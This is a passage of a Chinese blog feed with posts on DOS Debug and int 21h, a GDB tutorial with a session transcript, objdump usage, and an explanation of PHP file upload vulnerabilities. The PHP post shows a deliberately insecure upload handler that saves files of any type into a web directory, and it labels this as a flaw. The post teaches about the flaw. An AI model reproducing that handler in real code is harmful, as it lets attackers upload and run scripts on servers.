<h3 id="常用的debug功能"><a href="#常用的debug功能" class="headerlink" title="常用的debug功能"></a>常用的debug功能</h3><ul>
<li>用Debug的R命令查看、改变CPU寄存器内容；</li>
<li>用Debug的D命令查看内存中的内容；</li>
<li>用Debug的E命令查看内存中的内容；</li>
<li>用Debug的U命令将内存中机器指令翻译成汇编指令；</li>
<li>用Debug的T命令执行一条机器指令；</li>
<li>用Debug的A命令以汇编指令的格式在内存中写入一条机器指令；</li>
</ul>
<p><a href="https://blog.csdn.net/u013018721/article/details/51154153" target="_blank" rel="external">Dos下的调试工具debug的使用教程 </a></p>
<h3 id="汇编结尾int-20h-和int-21-h-啥区别"><a href="#汇编结尾int-20h-和int-21-h-啥区别" class="headerlink" title="汇编结尾int 20h 和int 21 h 啥区别"></a>汇编结尾int 20h 和int 21 h 啥区别</h3><p>int 20h只适用于ms-dos（相对应的有PC-DOS、FREE-DOS等等），而且int 20h要求入口参数CS=PSP段</p>
<h3 id="int指令引发的中断"><a href="#int指令引发的中断" class="headerlink" title="int指令引发的中断"></a>int指令引发的中断</h3><p>int n指令，相当于引发一个n号中断。</p>
<p>执行过程相当于：</p>
<p>（1）取中断类型码n。<br>（2）标志寄存器入栈；设置IF=0，TF=0。<br>（3）CS，IP入栈<br>（4）（IP）=（n<em>4），（CS）=（n</em>4+2）</p>
<h4 id="int-21h中断"><a href="#int-21h中断" class="headerlink" title="int 21h中断"></a>int 21h中断</h4><p>它是DOS提供的中断例程，包含了DOS提供给程序员在编程时调用的子程序。</p>
<p>前面我们一直用下面的代码返回:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mov  ax,4c00h  </div><div class="line">int 21h</div></pre></td></tr></table></figure></p>
<p>其实这是用了21号中断例程的4ch号子程序，al是用来存放程序返回值的，上面的代码即0.<br>本质就是:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mov ah,4ch  </div><div class="line">mov al,0  </div><div class="line">int 21h</div></pre></td></tr></table></figure></p>
<h4 id="带返回码的结束（AH-4CH）"><a href="#带返回码的结束（AH-4CH）" class="headerlink" title="带返回码的结束（AH=4CH）"></a>带返回码的结束（AH=4CH）</h4><p>功能：返回DOS</p>
<p>入口参数：无</p>
<p>调用方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">MOV    AH,4CH</div><div class="line">INT      21H</div></pre></td></tr></table></figure></p>
<p>通过4CH功能调用能够结束当前正在执行的程序，返回DOS系统，一般用于汇编程序的结束位置。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;Dubug是dos,windows下提供的调试工具，使用该工具，可以查看和修改寄存器，内存的内容。同时可以在机器码级别跟踪程序源码的运行。&lt;
    
    </summary>
    
      <category term="工具" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="工具" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>工具|gdb调试</title>
    <link href="http://yoursite.com/2018/03/27/%E5%B7%A5%E5%85%B7-gdb%E8%B0%83%E8%AF%95/"/>
    <id>http://yoursite.com/2018/03/27/工具-gdb调试/</id>
    <published>2018-03-27T14:48:03.000Z</published>
    <updated>2018-03-30T09:46:30.747Z</updated>
    
    <content type="html"><![CDATA[<h3 id="GDB概述"><a href="#GDB概述" class="headerlink" title="GDB概述"></a>GDB概述</h3><p>GDB是GNU开源组织发布的一个强大的UNIX下的程序调试工具。或许，各位比较喜欢那种图形界面方式的，像VC、BCB等IDE的调试，但如果你是在UNIX平台下做软件，你会发现GDB这个调试工具有比VC、BCB的图形化调试器更强大的功能。所谓“寸有所长，尺有所短”就是这个道理。</p>
<p>一般来说，GDB主要帮忙你完成下面四个方面的功能：</p>
<ol>
<li>启动你的程序，可以按照你的自定义的要求随心所欲的运行程序。</li>
<li>可让被调试的程序在你所指定的调置的断点处停住。（断点可以是条件表达式）</li>
<li>当程序被停住时，可以检查此时你的程序中所发生的事。</li>
<li>动态的改变你程序的执行环境。</li>
</ol>
<p>从上面看来，GDB和一般的调试工具没有什么两样，基本上也是完成这些功能，不过在细节上，你会发现GDB这个调试工具的强大，大家可能比较习惯了图形化的调试工具，但有时候，命令行的调试工具却有着图形化工具所不能完成的功能。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div></pre></td><td class="code"><pre><div class="line">源程序：tst.c</div><div class="line"></div><div class="line">     1 #include &lt;stdio.h&gt;</div><div class="line">     2</div><div class="line">     3 int func(int n)</div><div class="line">     4 &#123;</div><div class="line">     5         int sum=0,i;</div><div class="line">     6         for(i=0; i&lt;n; i++)</div><div class="line">     7         &#123;</div><div class="line">     8                 sum+=i;</div><div class="line">     9         &#125;</div><div class="line">    10         return sum;</div><div class="line">    11 &#125;</div><div class="line">    12</div><div class="line">    13</div><div class="line">    14 main()</div><div class="line">    15 &#123;</div><div class="line">    16         int i;</div><div class="line">    17         long result = 0;</div><div class="line">    18         for(i=1; i&lt;=100; i++)</div><div class="line">    19         &#123;</div><div class="line">    20                 result += i;</div><div class="line">    21         &#125;</div><div class="line">    22</div><div class="line">    23        printf(&quot;result[1-100] = %d /n&quot;, result );</div><div class="line">    24        printf(&quot;result[1-250] = %d /n&quot;, func(250) );</div><div class="line">    25 &#125;</div><div class="line"></div><div class="line">编译生成执行文件：（Linux下）</div><div class="line">    hchen/test&gt; gcc -g tst.c -o tst</div><div class="line"></div><div class="line">使用GDB调试：</div><div class="line"></div><div class="line">hchen/test&gt; gdb tst  &lt;---------- 启动GDB</div><div class="line">GNU gdb 5.1.1</div><div class="line">Copyright 2002 Free Software Foundation, Inc.</div><div class="line">GDB is free software, covered by the GNU General Public License, and you are</div><div class="line">welcome to change it and/or distribute copies of it under certain conditions.</div><div class="line">Type &quot;show copying&quot; to see the conditions.</div><div class="line">There is absolutely no warranty for GDB.  Type &quot;show warranty&quot; for details.</div><div class="line">This GDB was configured as &quot;i386-suse-linux&quot;...</div><div class="line">(gdb) l     &lt;-------------------- l命令相当于list，从第一行开始例出原码。</div><div class="line">1        #include &lt;stdio.h&gt;</div><div class="line">2</div><div class="line">3        int func(int n)</div><div class="line">4        &#123;</div><div class="line">5                int sum=0,i;</div><div class="line">6                for(i=0; i&lt;n; i++)</div><div class="line">7                &#123;</div><div class="line">8                        sum+=i;</div><div class="line">9                &#125;</div><div class="line">10               return sum;</div><div class="line">(gdb)       &lt;-------------------- 直接回车表示，重复上一次命令</div><div class="line">11       &#125;</div><div class="line">12</div><div class="line">13</div><div class="line">14       main()</div><div class="line">15       &#123;</div><div class="line">16               int i;</div><div class="line">17               long result = 0;</div><div class="line">18               for(i=1; i&lt;=100; i++)</div><div class="line">19               &#123;</div><div class="line">20                       result += i;    </div><div class="line">(gdb) break 16    &lt;-------------------- 设置断点，在源程序第16行处。</div><div class="line">Breakpoint 1 at 0x8048496: file tst.c, line 16.</div><div class="line">(gdb) break func  &lt;-------------------- 设置断点，在函数func()入口处。</div><div class="line">Breakpoint 2 at 0x8048456: file tst.c, line 5.</div><div class="line">(gdb) info break  &lt;-------------------- 查看断点信息。</div><div class="line">Num Type           Disp Enb Address    What</div><div class="line">1   breakpoint     keep y   0x08048496 in main at tst.c:16</div><div class="line">2   breakpoint     keep y   0x08048456 in func at tst.c:5</div><div class="line">(gdb) r           &lt;--------------------- 运行程序，run命令简写</div><div class="line">Starting program: /home/hchen/test/tst</div><div class="line"></div><div class="line">Breakpoint 1, main () at tst.c:17    &lt;---------- 在断点处停住。</div><div class="line">17               long result = 0;</div><div class="line">(gdb) n          &lt;--------------------- 单条语句执行，next命令简写。</div><div class="line">18               for(i=1; i&lt;=100; i++)</div><div class="line">(gdb) n</div><div class="line">20                       result += i;</div><div class="line">(gdb) n</div><div class="line">18               for(i=1; i&lt;=100; i++)</div><div class="line">(gdb) n</div><div class="line">20                       result += i;</div><div class="line">(gdb) c          &lt;--------------------- 继续运行程序，continue命令简写。</div><div class="line">Continuing.</div><div class="line">result[1-100] = 5050       &lt;----------程序输出。</div><div class="line"></div><div class="line">Breakpoint 2, func (n=250) at tst.c:5</div><div class="line">5                int sum=0,i;</div><div class="line">(gdb) n</div><div class="line">6                for(i=1; i&lt;=n; i++)</div><div class="line">(gdb) p i        &lt;--------------------- 打印变量i的值，print命令简写。</div><div class="line">$1 = 134513808</div><div class="line">(gdb) n</div><div class="line">8                        sum+=i;</div><div class="line">(gdb) n</div><div class="line">6                for(i=1; i&lt;=n; i++)</div><div class="line">(gdb) p sum</div><div class="line">$2 = 1</div><div class="line">(gdb) n</div><div class="line">8                        sum+=i;</div><div class="line">(gdb) p i</div><div class="line">$3 = 2</div><div class="line">(gdb) n</div><div class="line">6                for(i=1; i&lt;=n; i++)</div><div class="line">(gdb) p sum</div><div class="line">$4 = 3</div><div class="line">(gdb) bt        &lt;--------------------- 查看函数堆栈。</div><div class="line">#0  func (n=250) at tst.c:5</div><div class="line">#1  0x080484e4 in main () at tst.c:24</div><div class="line">#2  0x400409ed in __libc_start_main () from /lib/libc.so.6</div><div class="line">(gdb) finish    &lt;--------------------- 退出函数。</div><div class="line">Run till exit from #0  func (n=250) at tst.c:5</div><div class="line">0x080484e4 in main () at tst.c:24</div><div class="line">24              printf(&quot;result[1-250] = %d /n&quot;, func(250) );</div><div class="line">Value returned is $6 = 31375</div><div class="line">(gdb) c     &lt;--------------------- 继续运行。</div><div class="line">Continuing.</div><div class="line">result[1-250] = 31375    &lt;----------程序输出。</div><div class="line"></div><div class="line">Program exited with code 027. &lt;--------程序退出，调试结束。</div><div class="line">(gdb) q     &lt;--------------------- 退出gdb。</div><div class="line">hchen/test&gt;</div></pre></td></tr></table></figure>
<p>好了，有了以上的感性认识，还是让我们来系统地认识一下gdb吧。</p>
<h3 id="使用GDB"><a href="#使用GDB" class="headerlink" title="使用GDB"></a>使用GDB</h3><table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td>file &lt;文件名&gt;</td>
<td>加载被调试的可执行程序文件。因为一般都在被调试程序所在目录下执行GDB，因而文本名不需要带路径。</td>
<td>(gdb) file gdb-sample</td>
</tr>
<tr>
<td>r</td>
<td>Run的简写，运行被调试的程序。如果此前没有下过断点，则执行完整个程序；如果有断点，则程序暂停在第一个可用断点处。</td>
<td>(gdb) r</td>
</tr>
<tr>
<td>c</td>
<td>Continue的简写，继续执行被调试程序，直至下一个断点或程序结束。</td>
<td>(gdb) c</td>
</tr>
<tr>
<td>b &lt;行号&gt;; b &lt;函数名称&gt; ;b <em>&lt;函数名称&gt;; b </em>&lt;代码地址&gt;; d [编号]</td>
<td>b: Breakpoint的简写，设置断点。两可以使用“行号”“函数名称”“执行地址”等方式指定断点位置。其中在函数名称前面加“*”符号表示将断点设置在“由编译器生成的prolog代码处”。如果不了解汇编，可以不予理会此用法。d: Delete breakpoint的简写，删除指定编号的某个断点，或删除所有断点。断点编号从1开始递增。</td>
<td>(gdb) b 8 (gdb) b main  (gdb) b <em>main  (gdb) b </em>0x804835c  (gdb) d</td>
</tr>
<tr>
<td>s, n</td>
<td>s: 执行一行源程序代码，如果此行代码中有函数调用，则进入该函数；n: 执行一行源程序代码，此行代码中的函数调用也一并执行。s 相当于其它调试器中的“Step Into (单步跟踪进入)”；n 相当于其它调试器中的“Step Over (单步跟踪)”。这两个命令必须在有源代码调试信息的情况下才可以使用（GCC编译时使用“-g”参数）。</td>
<td>(gdb) s   (gdb) n</td>
</tr>
<tr>
<td>si, ni</td>
<td>si命令类似于s命令，ni命令类似于n命令。所不同的是，这两个命令（si/ni）所针对的是汇编指令，而s/n针对的是源代码。</td>
<td>(gdb) si (gdb) ni</td>
</tr>
<tr>
<td>p &lt;变量名称&gt;</td>
<td>Print的简写，显示指定变量（临时变量或全局变量）的值。</td>
<td>(gdb) p i  (gdb) p nGlobalVar</td>
</tr>
<tr>
<td>display …   ; undisplay &lt;编号&gt;</td>
<td>display，设置程序中断后欲显示的数据及其格式。例如，如果希望每次程序中断后可以看到即将被执行的下一条汇编指令，可以使用命令“display /i $pc”其中 $pc 代表当前汇编指令，/i表示以十六进行显示。当需要关心汇编代码时，此命令相当有用。undispaly，取消先前的display设置，编号从1开始递增。</td>
<td>(gdb) display /i $pc (gdb) undisplay 1</td>
</tr>
<tr>
<td>i</td>
<td>Info的简写，用于显示各类信息，详情请查阅“help i”。</td>
<td>(gdb) i r</td>
</tr>
<tr>
<td>q</td>
<td>Quit的简写，退出GDB调试环境。</td>
<td>(gdb) q</td>
</tr>
<tr>
<td>help [命令名称]</td>
<td>GDB帮助命令，提供对GDB名种命令的解释说明。如果指定了“命令名称”参数，则显示该命令的详细说明；如果没有指定参数，则分类显示所有GDB命令，供用户进一步浏览和查询。</td>
<td>(gdb) help display</td>
</tr>
</tbody>
</table>
<p>注:[断点还可以根据条件表达式设置断点]</p>
<p>程序在运行过程中，当某个条件满足时，程序在某行中断暂停执行</p>
<ul>
<li>方法1 命令格式：break行号或函数名 if  条件</li>
<li>方法2  watch &lt;条件表达式&gt;</li>
</ul>
<p>==whatis 命令==<br>作用：用来显示某个变量或表达式值的数据类型<br>格式：whatis &lt;变量或表达式&gt;</p>
<p>==set 命令==<br>作用：用来给变量赋值,当程序继续运行时，将使用更改后的值。<br>格式：set variable 变量=值   相当于print 变量=值</p>
<p>==next和step命令==</p>
<p>作用：一次一条地执行程序代码</p>
<p>next和step的区别：</p>
<ol>
<li>如果遇到函数调用，next会把该函数调用当作一条语句来执行，再次输入next会执行函数调用后的语句</li>
<li>step则会跟踪进入函数，一次一条地执行函数内的代码，直到函数的代码执行完，才执行函数调用后的语句</li>
</ol>
<p>== nexti和stepi命令==</p>
<p>作用：用来单步执行一条机器指令，注意不是单步执行一行语句。单步执行一行语句的命令是</p>
<p>next和step命令通常一条语句由多条机器指令构成</p>
<p>注意：nexti和next类似，不会跟踪进入函数内部去执行;Stepi和step类似，跟踪进入函数执行。</p>
<p>== list ==<br>list命令后面还可以更一些参数，来显示更多功能：</p>
<ul>
<li><linenum>    行号。</linenum></li>
<li>&lt;+&gt; [offset]    当前行号的正偏移量。</li>
<li>&lt;-&gt; [offset]     当前行号的负偏移量。</li>
<li><filename:linenum> 文件的中的行行。</filename:linenum></li>
<li><function>             函数的代码</function></li>
<li><filename:function>     文件中的函数。</filename:function></li>
<li>&lt;*address&gt; 程序运行时的语句在内存中的地址。</li>
</ul>
<h3 id="查看函数返回值"><a href="#查看函数返回值" class="headerlink" title="查看函数返回值"></a>查看函数返回值</h3><p>查看函数返回值是在调试的过程中经常遇到的需求。例如，对于如下函数</p>
<pre><code>int foo()
{
    return 100;
}
</code></pre><p>我们可以以如下方式获取函数的返回值：</p>
<ol>
<li><p>通过finish命令运行至函数结束，此时会打印函数返回值。</p>
<p> (gdb) finish<br> Run till exit from #0 foo () at main.c:9<br> main () at main.c:15<br> 15 }<br> Value returned is $2 = 100</p>
</li>
<li>返回值会存储在eax寄存器中，通过查看信息可以获取返回值。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">(gdb) p $eax</div><div class="line">$3 = 100</div><div class="line">(gdb) info registers</div><div class="line">eax 0x64 100</div></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="查看连续内存"><a href="#查看连续内存" class="headerlink" title="查看连续内存"></a>查看连续内存</h3><p>可以使用GDB的”@”操作符查看连续内存，”@”的左边是第一个内存的地址的值，”@”的右边则你你想查看内存的长度。</p>
<p>例如，对于如下代码：int arr[] = {2, 4, 6, 8, 10};，可以通过如下命令查看arr前三个单元的数据。</p>
<pre><code>(gdb) p *arr@3
$2 = {2, 4, 6}
</code></pre><h3 id="查看内存"><a href="#查看内存" class="headerlink" title="查看内存"></a>查看内存</h3><p>可以使用examine命令（简写为x）来查看内存地址中的值。x命令的语法如下所示：</p>
<p><code>x /&lt;n/f/u&gt; &lt;addr&gt;</code></p>
<ul>
<li>n 表示显示内存的长度，也就是说从当前地址向后显示几个地址的内容。</li>
<li>f 表示显示的格式，如果是字符串，则用s，如果是数字，则可以用i。</li>
<li>u 表示从当前地址往后请求的字节数，默认是4个bytes。（b单字节，h双字节，w四字节，g八字节）</li>
<li><addr> 表示一个内存地址。</addr></li>
</ul>
<p>例如：以两字节为单位显示前面的那个数组的地址后32字节内存信息如下.</p>
<pre><code>(gdb) x /16uh arr
0xbffff4cc: 2 0 4 0 6 0 8 0
0xbffff4dc: 10 0 34032 2052 0 0 0 0
</code></pre><h3 id="自动显示"><a href="#自动显示" class="headerlink" title="自动显示"></a>自动显示</h3><p>在VisualStudio中，可以通过监视窗口动态查看变量的值。在gdb中，也提供了类似的命令display，它的语法是：</p>
<ul>
<li>display expr</li>
<li>display fmt expr</li>
<li>display fmt addr</li>
</ul>
<p>expr是一个表达式，fmt表示显示的格式，addr表示内存地址。当你用display设定好了一个或多个表达式后，只要你的程序被停下来（单步跟踪时），GDB会自动显示你所设置的这些表达式的值。</p>
<h3 id="几个相关的命令如下："><a href="#几个相关的命令如下：" class="headerlink" title="几个相关的命令如下："></a>几个相关的命令如下：</h3><ul>
<li>undisplay <dnums...>        不显示dispaly</dnums...></li>
<li>delete display [dnums]    <em> 删除自动显示，不带dnums参数则删除所有自动显示，也支持范围删除，如： delete </em> display 1,3-5</li>
<li>disable display <dnums...>    使display失效</dnums...></li>
<li>enable display <dnums...>    恢复display</dnums...></li>
<li>info display        查看display信息</li>
</ul>
<h3 id="一些小技巧"><a href="#一些小技巧" class="headerlink" title="一些小技巧"></a>一些小技巧</h3><ul>
<li>查看所有的局部变量:<code>(gdb) info local</code></li>
<li>查看此时的栈状态 (反映了函数调用，见Linux从程序到进程):<code>(gdb) info stack</code></li>
</ul>
<h3 id="objdump命令的使用"><a href="#objdump命令的使用" class="headerlink" title="objdump命令的使用"></a>objdump命令的使用</h3><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>objdump -f test</td>
<td>显示test的文件头信息</td>
</tr>
<tr>
<td>objdump -d test</td>
<td>反汇编test中的需要执行指令的那些section</td>
</tr>
<tr>
<td>objdump -D test</td>
<td>与-d类似，但反汇编test中的所有section</td>
</tr>
<tr>
<td>objdump -h test</td>
<td>显示test的Section Header信息</td>
</tr>
<tr>
<td>objdump -x test</td>
<td>显示test的全部Header信息</td>
</tr>
<tr>
<td>objdump -s test</td>
<td>除了显示test的全部Header信息，还显示他们对应的十六进制文件代码</td>
</tr>
</tbody>
</table>
<h4 id="for-example"><a href="#for-example" class="headerlink" title="for example"></a>for example</h4><p>将C源代码和反汇编出来的指令对照：</p>
<ol>
<li>编译成目标文件（要加-g选项） <code>gcc -g -o test.c</code></li>
<li>输出C源代码和反汇编出来的指令对照的格式 <code>objdump -S test.o</code></li>
</ol>
<p><a href="https://blog.csdn.net/haoel/article/details/2879" target="_blank" rel="external">用GDB调试程序(一)</a><br><a href="https://blog.csdn.net/liigo/article/details/582231" target="_blank" rel="external">GDB十分钟教程</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;GDB概述&quot;&gt;&lt;a href=&quot;#GDB概述&quot; class=&quot;headerlink&quot; title=&quot;GDB概述&quot;&gt;&lt;/a&gt;GDB概述&lt;/h3&gt;&lt;p&gt;GDB是GNU开源组织发布的一个强大的UNIX下的程序调试工具。或许，各位比较喜欢那种图形界面方式的，像VC、BCB
    
    </summary>
    
      <category term="工具" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="工具" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>PHP|PHP漏洞全解-文件上传漏洞</title>
    <link href="http://yoursite.com/2018/03/27/PHP-PHP%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/03/27/PHP-PHP漏洞全解-文件上传漏洞/</id>
    <published>2018-03-26T22:25:14.000Z</published>
    <updated>2018-03-26T16:41:23.111Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>由于文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过 Web 访问的目录上传任意PHP文件，并能够将这些文件传递给 PHP解释器，就可以在远程服务器上执行任意PHP脚本，即文件上传漏洞。</p>
<p>一套web应用程序，一般都会提供文件上传的功能，方便来访者上传一些文件。</p>
<p>下面是一个简单的文件上传表单：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; name=&quot;form1&quot;&gt; </div><div class="line">    &lt;input type=&quot;file&quot; name=&quot;file1&quot; /&gt;&lt;br /&gt; </div><div class="line">    &lt;input type=&quot;submit&quot; value=&quot;上传文件&quot; /&gt; </div><div class="line">    &lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;1024&quot; /&gt; </div><div class="line">&lt;form&gt;</div></pre></td></tr></table></figure></p>
<p>php的配置文件php.ini，其中选项upload_max_filesize指定允许上传的文件大小，默认是2M，可根据实际情况修改。</p>
<h3 id="FILES数组变量"><a href="#FILES数组变量" class="headerlink" title="$_FILES数组变量"></a>$_FILES数组变量</h3><p>PHP使用变量$_FILES来上传文件，$_FILES是一个数组。如果上传test.txt，那么$_FILES数组的内容为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$FILES </div><div class="line">Array </div><div class="line">&#123; </div><div class="line">    [file] =&gt; Array </div><div class="line">        &#123; </div><div class="line">            [name] =&gt; test.txt //文件名称 </div><div class="line">            [type] =&gt; text/plain //MIME类型 </div><div class="line">            [tmp_name] =&gt; /tmp/php5D.tmp //临时文件 </div><div class="line">            [error] =&gt; 0 //错误信息 </div><div class="line">            [size] =&gt; 536 //文件大小，单位字节 </div><div class="line">        &#125; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>如果上传文件按钮的name属性值为file，即<br><code>&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</code></p>
<p>那么使用$_FILES[‘file’][‘name’]来获得客户端上传文件名称，不包含路径。使用$_FILES[‘file’][‘tmp_name’]来获得服务端保存上传文件的临时文件路径。</p>
<h4 id="存放上传文件"><a href="#存放上传文件" class="headerlink" title="存放上传文件"></a>存放上传文件</h4><p>PHP不会直接将上传文件放到网站根目录中，而是保存为一个临时文件，名称就是$_FILES[‘file’][‘tmp_name’]的值，开发者必须把这个临时文件复制到存放的网站文件夹中。</p>
<p>$_FILES[‘file’][‘tmp_name’]的值是由PHP设置的，与文件原始名称不一样，开发者必须使用$_FILES[‘file’][‘name’]来取得上传文件的原始名称。</p>
<h4 id="传文件时的错误信息"><a href="#传文件时的错误信息" class="headerlink" title="传文件时的错误信息"></a>传文件时的错误信息</h4><p>$_FILES[‘file’][‘error’]变量用来保存上传文件时的错误信息，它的值如下：</p>
<table>
<thead>
<tr>
<th>错误信息</th>
<th>数值</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>UPLOAD_ERR_OK</td>
<td>0</td>
<td>没有错误</td>
</tr>
<tr>
<td>UPLOAD_ERR_INI_SIZE</td>
<td>1</td>
<td>上传文件的大小超过php.ini的设置</td>
</tr>
<tr>
<td>UPLOAD_ERR_FROM_SIZE</td>
<td>2</td>
<td>上传文件的大小超过HTML表单中MAX_FILE_SIZE的值</td>
</tr>
<tr>
<td>UPLOAD_ERR_PARTIAL</td>
<td>3</td>
<td>只上传部分的文件</td>
</tr>
<tr>
<td>UPLOAD_ERR_NO_FILE</td>
<td>4</td>
<td>没有文件上传</td>
</tr>
</tbody>
</table>
<h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>如果提供给网站访问者上传图片的功能，那必须小心访问者上传的实际可能不是图片，而是可以指定的PHP程序。如果存放图片的目录是一个开放的文件夹，则入侵者就可以远程执行上传的PHP文件来进行攻击。</p>
<p>下面是一个简单的文件上传例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">php </div><div class="line">// 设置上传文件的目录 </div><div class="line">$uploaddir = &quot;D:/www/images/&quot;; </div><div class="line">// 检查file是否存在 </div><div class="line">if (isset($_FILES[&apos;file1&apos;])) </div><div class="line">&#123; </div><div class="line">    // 要放在网站目录中的完整路径，包含文件名 </div><div class="line">    $uploadfile = $uploaddir . $_FILES[&apos;file1&apos;][&apos;name&apos;]; </div><div class="line">    // 将服务器存放的路径，移动到真实文件名 </div><div class="line">    move_uploaded_file($_FILES[&apos;file1&apos;][&apos;tmp_name&apos;],$uploadfile); </div><div class="line">&#125; </div><div class="line">?&gt; </div><div class="line">…… </div><div class="line">&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; name=&quot;form1&quot;&gt; </div><div class="line">    &lt;input type=&quot;file&quot; name=&quot;file1&quot; /&gt;&lt;br /&gt; </div><div class="line">    &lt;input type=&quot;submit&quot; value=&quot;上传文件&quot; /&gt; </div><div class="line">    &lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;1024&quot; /&gt; </div><div class="line">&lt;form&gt;</div></pre></td></tr></table></figure>
<p>这个例子没有检验文件后缀，可以上传任意文件，很明显的上传漏洞。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;由于文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过 Web 访问的目录上传任意PHP文件，并能够
    
    </summary>
    
      <category term="PHP" scheme="http://yoursite.com/categories/PHP/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>工具|Cmder使用教程</title>
    <link href="http://yoursite.com/2018/03/27/%E5%B7%A5%E5%85%B7-Cmder%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
    <id>http://yoursite.com/2018/03/27/工具-Cmder使用教程/</id>
